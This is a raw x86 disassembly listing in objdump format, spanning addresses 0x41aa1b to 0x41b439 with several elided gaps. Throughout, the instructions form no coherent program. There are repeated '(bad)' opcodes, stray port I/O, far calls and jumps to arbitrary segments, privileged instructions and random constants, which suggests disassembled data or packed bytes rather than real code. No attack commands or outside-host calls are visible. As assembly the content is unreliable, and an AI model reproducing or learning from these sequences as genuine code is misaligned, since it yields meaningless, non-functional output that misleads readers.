  41aa1b:	shr    BYTE PTR [edi+0x35],0x50
  41aa1f:	pop    ecx
  41aa20:	jmp    0x5715:0x214cf82e
  41aa27:	out    dx,eax
  41aa28:	vpaddusb ymm7,ymm1,ymm3
  41aa2c:	add    dh,BYTE PTR [ebx]
  41aa2e:	test   BYTE PTR [eax+0x20bcefa8],bh
  41aa34:	push   ebp
  41aa35:	out    0x63,al
  41aa37:	call   0x371f:0x8ae0
  41aa3d:	push   ebx
  41aa3e:	xchg   BYTE PTR [esi-0xa67027e],bh
  41aa44:	mov    cl,BYTE PTR [eax+0x5f]
  41aa47:	push   edx
  41aa48:	leave  
  41aa49:	mov    esi,0x8a52bfb7
  41aa4e:	xor    dl,BYTE PTR [ebx+0x366f45af]
  41aa54:	call   0x49bdbbb6
  41aa59:	pushf  
  41aa5a:	sar    DWORD PTR [eax+ecx*1],0x12
  41aa5e:	popf   
  41aa5f:	add    DWORD PTR [ebp+0x6eb8d012],ebx
  41aa65:	and    BYTE PTR [eax],dh
  41aa67:	sar    DWORD PTR [bp+si+0x21e2],0x71
  41aa6d:	xlat   BYTE PTR ds:[ebx]
  41aa6e:	mov    edi,0x1a9b88d8
  41aa73:	test   cl,dl
  41aa75:	dec    esi
  41aa76:	cli    
  41aa77:	xchg   esp,eax
  41aa78:	pop    edi
  41aa79:	pop    ebp
  41aa7a:	pop    ebx
  41aa7b:	mov    al,BYTE PTR [edx-0x3a]
  41aa7e:	in     eax,0xf1
  41aa80:	push   ecx
  41aa81:	or     cl,BYTE PTR [edi]
  41aa83:	retf   
  41aa84:	push   0x6878591c
  41aa89:	jecxz  0x41aa1b
  41aa8b:	inc    ebx
  41aa8c:	out    dx,eax
  41aa8d:	cmp    eax,DWORD PTR [eax]
  41aa8f:	stos   BYTE PTR es:[edi],al
  41aa90:	in     eax,dx
  41aa91:	les    esi,FWORD PTR [edx+0xe]
  41aa94:	adc    DWORD PTR [ebx],edi
  41aa96:	fdivrp st(6),st
  41aa98:	pop    esi
  41aa99:	nop
  41aa9a:	ret    
  41aa9b:	rcr    DWORD PTR [ecx],1
  41aa9d:	mov    dl,dh
  41aa9f:	cs adc eax,0xd81f0408
  41aaa5:	mov    ch,0x9c
  41aaa7:	xchg   esp,eax
  41aaa8:	fild   QWORD PTR [ebx+ebp*2-0x79f20150]
  41aaaf:	stos   BYTE PTR es:[edi],al
  41aab0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aab1:	(bad)  
  41aab2:	not    DWORD PTR ds:0xd3a1251
  41aab8:	test   BYTE PTR [ebx+0x5d],cl
  41aabb:	arpl   WORD PTR [esi-0x67],dx
  41aabe:	jp     0x41aa84
  41aac0:	fdiv   st,st(7)
	...
  41ab32:	add    BYTE PTR [eax],al
  41ab34:	dec    edx
  41ab35:	(bad)  
  41ab36:	cli    
  41ab37:	inc    edi
  41ab38:	(bad)  
  41ab39:	jg     0x41ab3a
  41ab3b:	int    0x91
  41ab3d:	pop    es
  41ab3e:	sbb    ecx,DWORD PTR [edi-0x5d]
  41ab41:	push   eax
  41ab42:	mov    BYTE PTR ds:0x12120,bl
  41ab48:	test   BYTE PTR [eax],0x0
  41ab4b:	add    BYTE PTR [eax+0x23293e56],ah
  41ab51:	js     0x41abaf
  41ab53:	mov    eax,0x4d00517e
  41ab58:	jmp    0x2696931b
  41ab5d:	pop    ebx
  41ab5e:	lea    esp,[edi-0x2b]
  41ab61:	fistp  WORD PTR [esi-0x5c]
  41ab64:	ror    BYTE PTR [esi+0x3aed72b8],cl
  41ab6a:	push   esi
  41ab6b:	dec    ecx
  41ab6c:	(bad)  
  41ab6d:	push   edx
  41ab6e:	xor    BYTE PTR [edx],bh
  41ab70:	jns    0x41abf0
  41ab72:	push   eax
  41ab73:	jb     0x41ab06
  41ab75:	mov    eax,0x37d353e8
  41ab7a:	es and al,0xaa
  41ab7d:	mov    dl,0xec
  41ab7f:	lea    eax,[esi]
  41ab81:	adc    DWORD PTR [edi-0x743604b5],edi
  41ab87:	(bad)  
  41ab88:	dec    edi
  41ab89:	stos   BYTE PTR es:[edi],al
  41ab8a:	mul    BYTE PTR [ecx-0x10]
  41ab8d:	ss js  0x41ab79
  41ab90:	lods   al,BYTE PTR ds:[esi]
  41ab91:	jbe    0x41ac05
  41ab93:	mov    cl,0xba
  41ab95:	leave  
  41ab96:	inc    ebx
  41ab97:	push   edx
  41ab98:	mov    ch,0x76
  41ab9a:	lock cmp al,0x7d
  41ab9d:	lods   eax,DWORD PTR ds:[esi]
  41ab9e:	repnz loop 0x41abd2
  41aba1:	cmc    
  41aba2:	inc    eax
  41aba3:	ins    DWORD PTR es:[edi],dx
  41aba4:	inc    edx
  41aba5:	adc    al,0xf6
  41aba7:	dec    ecx
  41aba8:	xor    dh,cl
  41abaa:	inc    ecx
  41abab:	push   ebx
  41abac:	xlat   BYTE PTR ds:[ebx]
  41abad:	mov    dl,0xaf
  41abaf:	jle    0x41abbc
  41abb1:	fsubr  DWORD PTR [esi]
  41abb3:	jo     0x41ab68
  41abb5:	es fwait
  41abb7:	pop    ss
  41abb8:	add    ah,BYTE PTR ds:[ebp+0x42]
  41abbc:	(bad)  
  41abbd:	stos   DWORD PTR es:[edi],eax
  41abbe:	ins    BYTE PTR es:[edi],dx
  41abbf:	push   ss
  41abc0:	dec    esi
  41abc1:	call   0x4bc2:0x9534886d
  41abc8:	xor    al,BYTE PTR ds:0xb78cc9fc
  41abce:	adc    BYTE PTR [esi-0x6f2df3e],dl
  41abd4:	fld    QWORD PTR [esi-0x7bc6c1af]
  41abda:	test   al,0xec
  41abdc:	call   0x7b50:0x8b201b88
  41abe3:	dec    ebx
  41abe4:	mov    eax,ds:0x1d21aa1b
  41abe9:	or     BYTE PTR [ebx-0x6e],dl
  41abec:	mov    ah,0xf4
  41abee:	jne    0x41ac5d
  41abf0:	xchg   BYTE PTR [esi-0x43],bl
  41abf3:	out    0x68,eax
  41abf5:	push   ss
  41abf6:	jb     0x41abd4
  41abf8:	cld    
  41abf9:	(bad)  
  41abfa:	out    0x99,al
  41abfc:	xlat   BYTE PTR ds:[ebx]
  41abfd:	inc    ecx
  41abfe:	mov    esp,DWORD PTR [ecx-0x5b]
  41ac01:	dec    esp
  41ac02:	dec    esp
  41ac03:	push   0x72
  41ac05:	xchg   edx,eax
  41ac06:	or     eax,edi
  41ac08:	jp     0x41ac68
  41ac0a:	(bad)  
  41ac0b:	mov    eax,ds:0xe5c82161
  41ac10:	in     eax,0x7
  41ac12:	test   ebx,ecx
  41ac14:	mov    al,0xf4
  41ac16:	pop    esp
  41ac17:	ins    DWORD PTR es:[edi],dx
  41ac18:	test   BYTE PTR [esp+eax*1-0x29ec0b3c],cl
  41ac1f:	lahf   
  41ac20:	fistp  WORD PTR [eax+0x4b490371]
  41ac26:	mov    cl,0x98
  41ac28:	dec    ebp
  41ac29:	aaa    
  41ac2a:	cmp    al,BYTE PTR [eax+0x2fa3cdd4]
  41ac30:	sbb    eax,0x10f57ef4
  41ac35:	pop    ebp
  41ac36:	xchg   esp,eax
  41ac37:	mov    bl,0xf2
  41ac39:	int    0x29
  41ac3b:	ins    BYTE PTR es:[edi],dx
  41ac3c:	add    DWORD PTR [ecx-0x4a],0xffffffe4
  41ac40:	push   cs
  41ac41:	and    al,0x0
	...
  41acb3:	add    al,dh
  41acb5:	xchg   edi,eax
  41acb6:	std    
  41acb7:	cmp    al,0xff
  41acb9:	jle    0x41acac
  41acbb:	fisttp WORD PTR [esi+0x20]
  41acbe:	cmp    eax,0xa0fc6402
  41acc3:	pop    ebp
  41acc4:	push   ss
  41acc5:	and    al,BYTE PTR [ecx]
  41acc7:	add    dh,dh
  41acc9:	add    BYTE PTR [eax],al
  41accb:	add    BYTE PTR ds:0xa0383307,ch
  41acd1:	fsub   QWORD PTR [ecx]
  41acd3:	scas   eax,DWORD PTR es:[edi]
  41acd4:	clc    
  41acd5:	sti    
  41acd6:	addr16 pop edi
  41acd8:	pop    esp
  41acd9:	jnp    0x41ad2f
  41acdb:	jmp    0x41ac94
  41acdd:	mov    al,0x45
  41acdf:	mov    dh,cl
  41ace1:	mov    edi,0x2618e1be
  41ace6:	mov    es,edi
  41ace8:	pop    ds
  41ace9:	sub    BYTE PTR [edi-0x50],cl
  41acec:	sbb    eax,0xe86722b4
  41acf1:	enter  0x98c9,0x56
  41acf5:	fsub   QWORD PTR [ecx+0xaadd817]
  41acfb:	mov    ax,cx
  41acfe:	push   cs
  41acff:	div    BYTE PTR [edx+ebp*1-0x73]
  41ad03:	out    0x20,al
  41ad05:	dec    esp
  41ad06:	jecxz  0x41acb7
  41ad08:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad0a:	stos   DWORD PTR es:[edi],eax
  41ad0b:	push   esi
  41ad0c:	gs mov edi,0xff21985f
  41ad12:	leave  
  41ad13:	and    al,bl
  41ad15:	cdq    
  41ad16:	stos   DWORD PTR es:[edi],eax
  41ad17:	loop   0x41ad30
  41ad19:	std    
  41ad1a:	(bad)  [ecx]
  41ad1c:	lods   eax,DWORD PTR ds:[esi]
  41ad1d:	mov    ah,BYTE PTR [eax+0x8]
  41ad20:	pop    es
  41ad21:	add    BYTE PTR [eax+edx*8-0x1c1a8c18],dl
  41ad28:	mov    dh,0x14
  41ad2a:	test   BYTE PTR [edx],cl
  41ad2c:	and    edx,DWORD PTR [edi+0x46]
  41ad2f:	jp     0x41ad40
  41ad31:	hlt    
  41ad32:	mov    dh,ah
  41ad34:	call   0x97d15b0e
  41ad39:	in     al,0x9e
  41ad3b:	xor    DWORD PTR [edx],esi
  41ad3d:	xchg   DWORD PTR [edx+0x5],edx
  41ad40:	mov    ecx,0x1cad07e6
  41ad45:	mov    esi,0x82af5033
  41ad4a:	mov    DWORD PTR es:[edi+0x16],edi
  41ad4e:	aaa    
  41ad4f:	shl    esi,cl
  41ad51:	mov    dh,0x29
  41ad53:	sbb    al,0xbf
  41ad55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad56:	inc    ebp
  41ad57:	mov    bh,0xf9
  41ad59:	jns    0x41adbb
  41ad5b:	or     al,0x39
  41ad5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad5e:	rcr    edx,1
  41ad60:	xchg   esi,eax
  41ad61:	shl    eax,cl
  41ad63:	test   al,0x7b
  41ad65:	in     eax,dx
  41ad66:	loopne 0x41ade2
  41ad68:	add    eax,0xbef00808
  41ad6d:	pop    ds
  41ad6e:	xchg   ebx,eax
  41ad6f:	mov    ah,0xd2
  41ad71:	mov    ebp,0xd2694747
  41ad76:	inc    eax
  41ad77:	les    edi,FWORD PTR [ebx-0x49]
  41ad7a:	mov    edx,0xa53963a4
  41ad7f:	pop    edi
  41ad80:	adc    BYTE PTR ss:[esi+0x64abf570],0x8d
  41ad88:	icebp  
  41ad89:	sti    
  41ad8a:	dec    edi
  41ad8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad8c:	adc    eax,0xce7b736e
  41ad91:	xor    eax,0x19b0acc3
  41ad96:	addr16 pop ebx
  41ad98:	cmp    BYTE PTR [edi],al
  41ad9a:	(bad)  
  41ad9b:	imul   ebx,DWORD PTR [eax],0x2a
  41ad9e:	pop    esp
  41ad9f:	sbb    BYTE PTR ds:[eax],ch
  41ada2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ada3:	outs   dx,DWORD PTR ds:[esi]
  41ada4:	pop    esi
  41ada5:	ss (bad) 
  41ada7:	in     al,dx
  41ada8:	stos   DWORD PTR es:[di],eax
  41adaa:	jo     0x41ade5
  41adac:	add    eax,0xf5808b84
  41adb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41adb2:	mov    ecx,0x483188c8
  41adb7:	jns    0x41ad61
  41adb9:	repz loopne 0x41adcb
  41adbc:	jnp    0x41ad5f
  41adbe:	ret    0x53b8
  41adc1:	sbb    eax,DWORD PTR [eax]
	...
  41ae33:	add    BYTE PTR [edi+0x5fc517d8],al
  41ae39:	iret   
  41ae3a:	xlat   BYTE PTR ds:[ebx]
  41ae3b:	ficom  DWORD PTR [edi-0x4c888be3]
  41ae41:	jle    0x41ae41
  41ae43:	xor    cl,BYTE PTR [ebx+eiz*1]
  41ae46:	add    DWORD PTR [eax],eax
  41ae48:	test   BYTE PTR [eax],0x0
  41ae4b:	add    BYTE PTR [ecx+0x5611b71a],ch
  41ae51:	cwde   
  41ae52:	out    0x8c,al
  41ae54:	jg     0x41aebb
  41ae56:	sub    eax,0x6712025d
  41ae5b:	or     eax,0x32fa4db7
  41ae60:	sub    edi,DWORD PTR [edx-0x3f]
  41ae63:	push   ebx
  41ae64:	shr    DWORD PTR [esi-0x3574573f],1
  41ae6a:	mov    ebp,ebp
  41ae6c:	jmp    0x290a45e4
  41ae71:	dec    ecx
  41ae72:	inc    ebx
  41ae73:	test   al,0x51
  41ae75:	pop    esp
  41ae76:	pop    esp
  41ae77:	jecxz  0x41ae13
  41ae79:	daa    
  41ae7a:	adc    edx,DWORD PTR [eax+ecx*8+0x6ea1e2e6]
  41ae81:	out    0x5c,eax
  41ae83:	or     eax,DWORD PTR [edx+0x71]
  41ae86:	in     al,0xe3
  41ae88:	jae    0x41af03
  41ae8a:	(bad)  
  41ae8b:	xchg   DWORD PTR [esi+0x31],edx
  41ae8e:	sti    
  41ae8f:	dec    ebp
  41ae90:	xchg   edi,eax
  41ae91:	retf   0xa8fb
  41ae94:	mov    bh,0x4d
  41ae96:	jmp    0x107b6122
  41ae9b:	cld    
  41ae9c:	ins    DWORD PTR es:[edi],dx
  41ae9d:	inc    eax
  41ae9e:	scas   al,BYTE PTR es:[edi]
  41ae9f:	sbb    eax,0xcfe8226e
  41aea4:	or     al,0x5f
  41aea6:	in     al,dx
  41aea7:	in     al,dx
  41aea8:	sti    
  41aea9:	je     0x41af24
  41aeab:	fwait
  41aeac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aead:	stos   DWORD PTR es:[edi],eax
  41aeae:	out    dx,al
  41aeaf:	stos   BYTE PTR es:[edi],al
  41aeb0:	xor    bh,BYTE PTR [edx]
  41aeb2:	les    ecx,FWORD PTR [eax+0xd]
  41aeb5:	sbb    BYTE PTR [ecx],ch
  41aeb7:	dec    ebp
  41aeb8:	les    ebx,FWORD PTR [ebp+ebp*8+0x9]
  41aebc:	mov    ds:0x3a35895e,eax
  41aec1:	clc    
  41aec2:	xor    ebp,DWORD PTR [edx+eiz*8-0x37]
  41aec6:	inc    esp
  41aec7:	aaa    
  41aec8:	push   ecx
  41aec9:	(bad)  
  41aeca:	xor    dh,cl
  41aecc:	lahf   
  41aecd:	mov    ecx,0xa9661414
  41aed2:	mov    edi,0x36b1c38c
  41aed7:	mov    ah,0x85
  41aed9:	push   eax
  41aeda:	mov    esi,0x9cdfeca1
  41aedf:	jns    0x41ae9b
  41aee1:	mov    eax,DWORD PTR [edx-0x473d39e7]
  41aee7:	xchg   ebx,eax
  41aee8:	out    0xd4,eax
  41aeea:	fs xchg edx,eax
  41aeec:	shl    BYTE PTR [ecx-0x64],0x47
  41aef0:	loopne 0x41ae77
  41aef2:	stc    
  41aef3:	push   ds
  41aef4:	shl    DWORD PTR [edx-0x2f123ec6],1
  41aefa:	mov    eax,edx
  41aefc:	jecxz  0x41af2e
  41aefe:	mov    edx,0xb5798690
  41af03:	jmp    0x958144d0
  41af08:	pop    edx
  41af09:	mov    bh,0x4b
  41af0b:	mov    ebx,0xb97c5b4f
  41af10:	sahf   
  41af11:	data16 adc al,0xbb
  41af14:	and    al,0xf
  41af16:	sub    DWORD PTR [edx-0x5cb6ed6b],ebp
  41af1c:	test   eax,0xa7748ccc
  41af21:	pop    es
  41af22:	sub    BYTE PTR ds:0x61205f62,0xf1
  41af29:	jnp    0x41afaa
  41af2b:	mov    eax,ds:0x49d2f1f1
  41af30:	add    al,0xee
  41af32:	inc    esi
  41af33:	pop    ecx
  41af34:	mov    ecx,?
  41af36:	mul    al
  41af38:	bnd jbe 0x41af7c
  41af3b:	mov    dh,0xde
  41af3d:	push   ds
  41af3e:	jb     0x41af41
  41af40:	mov    ebx,0xc2
	...
  41afb1:	add    BYTE PTR [eax],al
  41afb3:	add    BYTE PTR [esi-0x15],cl
  41afb6:	sub    cl,BYTE PTR [esi-0x51]
  41afb9:	iret   
  41afba:	outs   dx,BYTE PTR ds:[esi]
  41afbb:	jmp    0x41af3d
  41afbd:	rcl    DWORD PTR [esi+0x1d],0x7f
  41afc1:	inc    eax
  41afc2:	aas    
  41afc3:	pop    esp
  41afc4:	add    ah,BYTE PTR [ecx+eax*1]
  41afc7:	add    dh,dh
  41afc9:	add    BYTE PTR [eax],al
  41afcb:	add    BYTE PTR [edi-0x641962c6],al
  41afd1:	dec    ebx
  41afd2:	pop    edi
  41afd3:	mov    edx,DWORD PTR [edi-0x55afcc92]
  41afd9:	(bad)  
  41afda:	fidiv  WORD PTR [ebx]
  41afdc:	shl    BYTE PTR [ecx+0x36],cl
  41afdf:	out    0xbb,al
  41afe1:	(bad)  
  41afe3:	or     eax,0x190fa510
  41afe8:	rcl    DWORD PTR [edi+0x3a837f01],1
  41afee:	fidivr WORD PTR [ecx-0x3d]
  41aff1:	inc    ebp
  41aff2:	xchg   BYTE PTR [eax+0x7a3f94f7],bh
  41aff8:	or     edx,DWORD PTR [ebp-0x4]
  41affb:	pop    edi
  41affc:	loopne 0x41b030
  41affe:	mov    al,ds:0x1673ed8
  41b003:	inc    esp
  41b004:	fld    DWORD PTR [ecx]
  41b006:	pop    edx
  41b007:	mov    al,0x91
  41b009:	inc    eax
  41b00a:	loope  0x41afcf
  41b00c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b00d:	cli    
  41b00e:	cmp    cl,BYTE PTR [ecx+0x78]
  41b011:	add    al,0x40
  41b013:	pop    esp
  41b014:	add    esp,ebp
  41b016:	add    DWORD PTR [eax-0x6ebdff71],ebx
  41b01c:	mov    ebx,0xd44ee8c4
  41b021:	data16 rcl BYTE PTR [ebx+ecx*2],cl
  41b025:	cmp    al,0xb0
  41b027:	push   0xfffffff8
  41b029:	push   0xffffffd2
  41b02b:	add    bh,BYTE PTR [edi+0x4d614426]
  41b031:	sahf   
  41b032:	mov    esp,ebp
  41b034:	lds    eax,FWORD PTR gs:[esi+0x1c]
  41b038:	repz iret 
  41b03a:	ins    BYTE PTR es:[edi],dx
  41b03b:	paddsw mm7,QWORD PTR [ecx]
  41b03e:	or     al,0x35
  41b040:	dec    edx
  41b041:	inc    esi
  41b042:	or     eax,ecx
  41b044:	mov    esp,0xc9156a43
  41b049:	jmp    0xfe5ddb5f
  41b04e:	xor    bl,dl
  41b050:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b051:	call   0x25e2:0xbd53b9d7
  41b058:	mov    edx,0xd9ecb74
  41b05d:	sub    al,0xcf
  41b05f:	lds    edi,FWORD PTR [eax]
  41b061:	imul   esp,ebx,0xfffffff0
  41b064:	mov    dh,0x87
  41b066:	lods   eax,DWORD PTR ds:[esi]
  41b067:	add    ah,dl
  41b069:	and    DWORD PTR [ebx+0x13],eax
  41b06c:	cwde   
  41b06d:	aas    
  41b06e:	mov    fs,WORD PTR [ecx+0x5e]
  41b071:	xchg   edx,eax
  41b072:	dec    esi
  41b073:	inc    esi
  41b074:	mov    al,ds:0xab892fa1
  41b079:	xchg   ebp,eax
  41b07a:	ins    DWORD PTR es:[edi],dx
  41b07b:	call   0x7c9:0x2fb4
  41b081:	pop    es
  41b082:	sub    BYTE PTR [edi+ecx*1-0x18],ah
  41b086:	mov    ds:0xebee37a4,al
  41b08b:	mov    edx,0x8a0dba40
  41b090:	bnd jmp 0x41b0f0
  41b093:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b094:	fadd   DWORD PTR [esi+esi*1-0xe]
  41b098:	dec    ecx
  41b099:	das    
  41b09a:	mov    fs,WORD PTR [edx+esi*1]
  41b09d:	pop    ds
  41b09e:	jne    0x41b103
  41b0a0:	ins    BYTE PTR es:[edi],dx
  41b0a1:	mov    esp,0x1619372f
  41b0a6:	cmp    DWORD PTR [edx+eiz*2-0x7],ecx
  41b0aa:	lahf   
  41b0ab:	(bad)  
  41b0ac:	pop    ss
  41b0ad:	nop
  41b0ae:	mov    edi,0xced13088
  41b0b3:	lods   al,BYTE PTR ds:[esi]
  41b0b4:	pop    esp
  41b0b5:	ja     0x41b03a
  41b0b7:	mov    esp,0x2d56a384
  41b0bc:	or     BYTE PTR [ecx],bh
  41b0be:	(bad)  
  41b0bf:	or     ebp,DWORD PTR [edi-0x70]
	...
  41b132:	add    BYTE PTR [eax],al
  41b134:	sbb    al,0xc
  41b136:	std    
  41b137:	sbb    ebp,edi
  41b139:	stc    
  41b13a:	cld    
  41b13b:	or     eax,0x64289710
  41b140:	push   0xffffffee
  41b142:	test   DWORD PTR [eax],eax
  41b144:	clc    
  41b145:	and    al,0x1
  41b147:	add    dh,dh
  41b149:	add    BYTE PTR [eax],al
  41b14b:	add    BYTE PTR [edi+0x62],dl
  41b14e:	sub    BYTE PTR [esi+0x1d],al
  41b151:	movntq QWORD PTR [edi],mm5
  41b154:	pusha  
  41b155:	in     eax,dx
  41b156:	test   al,0x5b
  41b158:	push   esi
  41b159:	(bad)  
  41b15a:	aaa    
  41b15b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b15c:	sub    al,ch
  41b15e:	mov    eax,ds:0x147ad40a
  41b163:	and    eax,0x8374228a
  41b168:	mov    dh,0x24
  41b16a:	ins    DWORD PTR es:[di],dx
  41b16c:	mov    ch,0x2a
  41b16e:	scas   eax,DWORD PTR es:[edi]
  41b16f:	in     eax,dx
  41b170:	add    BYTE PTR [ebx-0x7c],bh
  41b173:	jae    0x41b1c8
  41b175:	pushf  
  41b176:	js     0x41b117
  41b178:	jns    0x41b1f4
  41b17a:	xchg   esi,eax
  41b17b:	inc    esp
  41b17c:	push   cs
  41b17d:	stos   DWORD PTR es:[edi],eax
  41b17e:	(bad)  
  41b17f:	or     eax,edx
  41b181:	sbb    WORD PTR [ecx+ecx*2-0x69dd63b1],ax
  41b189:	adc    BYTE PTR [esi],0x59
  41b18c:	cmp    DWORD PTR [edx-0x56],ecx
  41b18f:	fnsave [ebx+0x1ad8e98]
  41b195:	and    al,al
  41b197:	or     al,BYTE PTR [ecx+0x2d4236eb]
  41b19d:	fwait
  41b19e:	nop
  41b19f:	dec    edi
  41b1a0:	les    eax,FWORD PTR [edi]
  41b1a2:	sahf   
  41b1a3:	imul   ebx,edi,0xffffffd6
  41b1a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b1a7:	push   esi
  41b1a8:	xor    ecx,DWORD PTR [ebx-0x5e]
  41b1ab:	adc    eax,0x50820c74
  41b1b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b1b1:	jns    0x41b168
  41b1b3:	and    DWORD PTR [edi+eax*2+0x1478f008],esi
  41b1ba:	cmp    BYTE PTR [edi-0x50],ah
  41b1bd:	push   ebp
  41b1be:	jge    0x41b19e
  41b1c0:	stc    
  41b1c1:	clc    
  41b1c2:	adc    al,0xfe
  41b1c4:	mov    DWORD PTR [edx-0x55],eax
  41b1c7:	mov    ds:0x1f961369,eax
  41b1cc:	sbb    eax,esp
  41b1ce:	push   esp
  41b1cf:	cli    
  41b1d0:	cmp    eax,0x19923269
  41b1d5:	pop    esp
  41b1d6:	mul    DWORD PTR [esi-0x1c]
  41b1d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b1da:	sbb    al,BYTE PTR [esi-0x1f]
  41b1dd:	adc    cl,BYTE PTR [ecx+eax*2-0x4a0efed5]
  41b1e4:	pushf  
  41b1e5:	and    BYTE PTR [edx+0xd23184a],ch
  41b1eb:	data16 ds std 
  41b1ee:	xor    eax,0x100e1a40
  41b1f3:	inc    ebx
  41b1f4:	jbe    0x41b271
  41b1f6:	xlat   BYTE PTR ds:[ebx]
  41b1f7:	mov    ebp,0xc4b2c280
  41b1fc:	and    ebp,ebp
  41b1fe:	cmp    eax,0x9aeba5d8
  41b203:	repnz mov BYTE PTR [edx+ebp*1-0x37],cl
  41b208:	dec    ecx
  41b209:	call   0x8faec403
  41b20e:	into   
  41b20f:	inc    ecx
  41b210:	sahf   
  41b211:	out    0x24,al
  41b213:	not    BYTE PTR [ecx-0xa]
  41b216:	lea    esi,[esi+0x5a]
  41b219:	arpl   WORD PTR [ecx],di
  41b21b:	mov    edx,0x13ee0416
  41b220:	mov    ebx,ecx
  41b222:	cli    
  41b223:	sub    DWORD PTR [esi+0x7443a994],0x3f
  41b22a:	clc    
  41b22b:	push   ss
  41b22c:	mov    ecx,0x473031ec
  41b231:	mov    al,0x76
  41b233:	or     al,0x34
  41b235:	pop    es
  41b236:	push   esp
  41b237:	xor    edi,esp
  41b239:	test   DWORD PTR [esi-0x74],0x7a6f8162
  41b240:	cld    
  41b241:	pop    eax
	...
  41b2b2:	add    BYTE PTR [eax],al
  41b2b4:	neg    DWORD PTR [eax-0x58]
  41b2b7:	adc    ebp,DWORD PTR [edi+0x3afcfff3]
  41b2bd:	out    dx,eax
  41b2be:	jl     0x41b2c7
  41b2c0:	and    DWORD PTR [ebx+0x2e],0x125eec4
  41b2c7:	add    dh,dh
  41b2c9:	add    BYTE PTR [eax],al
  41b2cb:	add    BYTE PTR ds:0x9a5b6781,dh
  41b2d1:	int    0x33
  41b2d3:	ficomp WORD PTR [ecx-0x10]
  41b2d6:	mov    dl,0x74
  41b2d8:	pusha  
  41b2d9:	adc    edx,DWORD PTR [edi]
  41b2db:	push   esp
  41b2dc:	push   ss
  41b2dd:	jns    0x41b26c
  41b2df:	test   al,0x9c
  41b2e1:	ror    BYTE PTR [ecx-0x5bb626af],1
  41b2e7:	or     ebp,DWORD PTR [ecx-0x5e4fd058]
  41b2ed:	clc    
  41b2ee:	aaa    
  41b2ef:	ds jp  0x41b2f4
  41b2f2:	cmp    bh,BYTE PTR [ecx*4+0x5b18f224]
  41b2f9:	adc    al,0xa6
  41b2fb:	mov    WORD PTR [edx],ss
  41b2fd:	xchg   BYTE PTR [edi+0x1239018d],dh
  41b303:	mov    cl,0x23
  41b305:	inc    edx
  41b306:	ret    0x7d53
  41b309:	and    bl,BYTE PTR [ebx+0x12a039d5]
  41b30f:	arpl   WORD PTR [edx+0x7c],bx
  41b312:	jmp    0x41b338
  41b314:	push   ecx
  41b315:	sub    esi,DWORD PTR [ecx-0x21]
  41b318:	cld    
  41b319:	fild   WORD PTR [eax]
  41b31b:	xor    al,0x64
  41b31d:	dec    esi
  41b31e:	adc    DWORD PTR [eax+0x65],ecx
  41b321:	inc    ecx
  41b322:	test   BYTE PTR [ebx+0x1b],dl
  41b325:	sbb    eax,0x686f7dfd
  41b32a:	mov    ds:0xb78551eb,eax
  41b32f:	pop    DWORD PTR [ebp-0x219a30c8]
  41b335:	mov    ebp,0xcd6492fb
  41b33a:	inc    ebx
  41b33b:	js     0x41b368
  41b33d:	xchg   edx,eax
  41b33e:	or     DWORD PTR [edi+0x1b],edx
  41b341:	lahf   
  41b342:	ins    DWORD PTR es:[edi],dx
  41b343:	or     al,0x7
  41b345:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b346:	in     al,dx
  41b347:	retf   0x7eac
  41b34a:	lds    edi,FWORD PTR [edx-0x18]
  41b34d:	aas    
  41b34e:	pop    es
  41b34f:	inc    ebx
  41b350:	outs   dx,DWORD PTR ds:[esi]
  41b351:	sub    ah,BYTE PTR ds:[edx+0x6b]
  41b355:	mov    dl,0xc3
  41b357:	mov    ch,0xa5
  41b359:	data16 sub dl,BYTE PTR [ebx+edi*8]
  41b35d:	push   ss
  41b35e:	sbb    BYTE PTR [esi+esi*8],al
  41b361:	sub    BYTE PTR [edi],0xbf
  41b364:	cmp    BYTE PTR [ebp-0x35],ah
  41b367:	mov    eax,ds:0x1ef48511
  41b36c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b36d:	stos   BYTE PTR es:[edi],al
  41b36e:	popf   
  41b36f:	pslld  mm7,mm5
  41b372:	or     DWORD PTR [edi],ebx
  41b374:	(bad)  [edi+0x53]
  41b377:	dec    ecx
  41b378:	fist   DWORD PTR [esi+0x75]
  41b37b:	fist   DWORD PTR [ebx]
  41b37d:	add    esi,DWORD PTR [ebp-0x6]
  41b380:	or     al,0x9e
  41b382:	mov    ebx,0xfe1ba330
  41b387:	dec    edi
  41b388:	adc    al,0xdf
  41b38a:	mov    edx,0x307d5446
  41b38f:	xchg   esi,eax
  41b390:	jns    0x41b328
  41b392:	inc    ebx
  41b393:	push   ss
  41b394:	fdivr  DWORD PTR [esi+0x6d]
  41b397:	sub    ebx,edi
  41b399:	aas    
  41b39a:	test   al,0xee
  41b39c:	mov    ch,0x9e
  41b39e:	mov    ds:0x40dd65bd,al
  41b3a3:	setnp  BYTE PTR [ebx]
  41b3a6:	dec    ebp
  41b3a7:	shr    BYTE PTR [ebx-0x26],cl
  41b3aa:	sbb    DWORD PTR [esi],esi
  41b3ac:	inc    edx
  41b3ad:	cwde   
  41b3ae:	fwait
  41b3af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b3b0:	fbld   TBYTE PTR [ebx]
  41b3b2:	pop    edi
  41b3b3:	sbb    ah,ah
  41b3b5:	add    ebp,DWORD PTR [esi]
  41b3b7:	inc    edi
  41b3b8:	fst    QWORD PTR ds:0x52c909be
  41b3be:	shl    DWORD PTR [edi],0xde
  41b3c1:	dec    eax
	...
  41b432:	add    BYTE PTR [eax],al
  41b434:	mov    edi,0xff0fcf82
  41b439:	dec    edi
